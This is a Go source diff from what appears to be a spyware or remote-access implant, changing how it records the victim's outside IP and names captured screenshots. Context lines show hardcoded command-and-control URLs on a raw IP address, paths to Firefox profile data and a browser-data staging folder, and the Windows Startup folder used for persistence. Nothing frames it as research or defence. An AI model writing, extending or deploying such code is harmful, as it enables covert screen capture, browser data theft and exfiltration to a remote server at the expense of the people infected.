@@ -26,7 +26,7 @@ import (
 	"time"
 )
 
-const VERSION string = "4"
+const VERSION string = "5"
 const MIDURL string = "http://111.231.82.173/"
 const MIDFILE string = "http://111.231.82.173/file/"
 const MIDAUTH string = "http://111.231.82.173:9000/auth"
@@ -44,7 +44,8 @@ var BrowserSafepath = get_current_user() + "\\tmp\\"
 var Firefox = get_current_user() + "\\fire\\"
 var Firefoxpath = get_current_user() + "\\appdata\\Roaming\\Mozilla\\Firefox\\Profiles"
 var AUTOSTART = get_current_user() + "\\appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-var OUTIP string
+
+//var OUTIP string
 
 type Msg struct {
 	Hostid string `json:"hostid"`
@@ -52,9 +53,14 @@ type Msg struct {
 }
 
 // get out ip
-func GetOutIp() {
-	body, _ := ioutil.ReadFile(CURRENTPATH + "ip.txt")
-	OUTIP = strings.TrimSpace(string(body))
+func GetOutIp() string {
+	// nil kill process
+	body, err := ioutil.ReadFile(CURRENTPATH + "ip.txt")
+	if err != nil {
+		log.Panic(err)
+		return "none"
+	}
+	return strings.TrimSpace(string(body))
 }
 
 func get_current_user() string {
@@ -269,8 +275,8 @@ func Getscreenshot() []string {
 		} else {
 			fpth = `/tmp/`
 		}
-		GetOutIp()
-		fileName := fmt.Sprintf("%s-%s-%d-%dx%d.png", HOSTID, OUTIP, i, bounds.Dx(), bounds.Dy())
+		oip := GetOutIp()
+		fileName := fmt.Sprintf("%s-%s-%d-%dx%d.png", HOSTID, oip, i, bounds.Dx(), bounds.Dy())
 		fullpath := fpth + fileName
 		filenames = append(filenames, fullpath)
 		file, _ := os.Create(fullpath)
